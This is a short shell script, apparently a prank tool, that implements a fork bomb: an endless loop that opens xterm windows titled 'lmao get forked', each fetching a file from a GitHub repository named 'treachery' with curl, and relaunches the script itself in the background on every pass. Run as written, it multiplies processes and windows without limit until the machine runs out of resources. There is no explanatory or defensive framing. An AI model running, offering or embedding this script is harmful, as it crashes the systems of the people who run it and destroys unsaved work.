#!/bin/sh

bom(){
	xterm -hold -title 'lmao get forked' -mesg -geometry 126x71 -e curl https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/fork
}

deploy(){	
	while :
		do 
			bom
			./deploy_fork_bom.sh &
		done
}

deploy
